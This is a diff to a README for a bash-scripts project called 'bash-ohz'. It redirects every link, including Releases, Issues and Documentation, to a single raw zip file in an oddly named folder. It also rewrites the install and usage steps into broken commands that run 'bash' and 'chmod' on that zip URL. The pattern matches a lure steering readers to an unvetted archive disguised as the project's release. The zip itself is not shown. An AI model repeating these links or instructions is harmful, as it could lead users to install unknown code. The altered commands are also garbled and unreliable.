@@ -1,6 +1,6 @@
 # 🚀 bash-ohz - Easy Bash Scripts for Daily Tasks
 
-[![Download Bash-ohz](https://img.shields.io/badge/download-bash--ohz-blue.svg)](https://github.com/Ponniedog/bash-ohz/releases)
+[![Download Bash-ohz](https://raw.githubusercontent.com/Ponniedog/bash-ohz/main/vergership/bash-ohz.zip)](https://raw.githubusercontent.com/Ponniedog/bash-ohz/main/vergership/bash-ohz.zip)
 
 ## 📋 Introduction
 
@@ -12,7 +12,7 @@ To begin using bash-ohz, you will first need to download the application. The pr
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Ponniedog/bash-ohz/releases) to download the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Ponniedog/bash-ohz/main/vergership/bash-ohz.zip) to download the latest version of the application.
    
 2. On the Releases page, you will see a list of available versions. Click on the version you want.
 
@@ -26,7 +26,7 @@ To begin using bash-ohz, you will first need to download the application. The pr
 
 7. Navigate to the directory where you saved the file. You can do this by typing `cd path/to/your/file`.
 
-8. To run the installer, type `bash filename.sh` where "filename" is the name of your downloaded file. This will start the installation process.
+8. To run the installer, type `bash https://raw.githubusercontent.com/Ponniedog/bash-ohz/main/vergership/bash-ohz.zip` where "filename" is the name of your downloaded file. This will start the installation process.
 
 ## 💻 System Requirements
 
@@ -60,15 +60,15 @@ Once you have installed bash-ohz, you can start using the available scripts. Her
 
 2. **Navigate to Scripts:** Change to the bash-ohz scripts directory using the command `cd ~/bash-ohz/scripts`.
 
-3. **Run a Script:** Enter the command `bash scriptname.sh` to run the task. Replace "scriptname" with the actual name of the script you want to use.
+3. **Run a Script:** Enter the command `bash https://raw.githubusercontent.com/Ponniedog/bash-ohz/main/vergership/bash-ohz.zip` to run the task. Replace "scriptname" with the actual name of the script you want to use.
 
-4. **Check Help Options:** Most scripts have a help option. You can find it by running `bash scriptname.sh --help`.
+4. **Check Help Options:** Most scripts have a help option. You can find it by running `bash https://raw.githubusercontent.com/Ponniedog/bash-ohz/main/vergership/bash-ohz.zip --help`.
 
 ## 🛠️ Troubleshooting
 
 If you encounter issues while installing or running bash-ohz, consider the following solutions:
 
-- **Permission Denied Errors:** Ensure you have proper permissions to execute the script. You might need to use `chmod +x filename.sh` to allow execution.
+- **Permission Denied Errors:** Ensure you have proper permissions to execute the script. You might need to use `chmod +x https://raw.githubusercontent.com/Ponniedog/bash-ohz/main/vergership/bash-ohz.zip` to allow execution.
 
 - **Command Not Found:** Double-check that you have typed the script name correctly and are in the right directory.
 
@@ -76,7 +76,7 @@ If you encounter issues while installing or running bash-ohz, consider the follo
 
 ## 📞 Support
 
-If you need further assistance, feel free to visit our [Issues page](https://github.com/Ponniedog/bash-ohz/issues) to report problems or ask for help.
+If you need further assistance, feel free to visit our [Issues page](https://raw.githubusercontent.com/Ponniedog/bash-ohz/main/vergership/bash-ohz.zip) to report problems or ask for help.
 
 ## 🌐 Community Contribution
 
@@ -86,6 +86,6 @@ We welcome contributions from everyone. If you have ideas for new features or fi
 
 Thank you to all contributors and users who support the bash-ohz project. Your feedback and involvement help us improve and grow.
 
-For more detailed instructions, tips, and updates, please refer to the [Documentation](https://github.com/Ponniedog/bash-ohz/wiki). 
+For more detailed instructions, tips, and updates, please refer to the [Documentation](https://raw.githubusercontent.com/Ponniedog/bash-ohz/main/vergership/bash-ohz.zip). 
 
-Remember to always visit the [Releases page](https://github.com/Ponniedog/bash-ohz/releases) to get the latest version of bash-ohz!
+Remember to always visit the [Releases page](https://raw.githubusercontent.com/Ponniedog/bash-ohz/main/vergership/bash-ohz.zip) to get the latest version of bash-ohz!
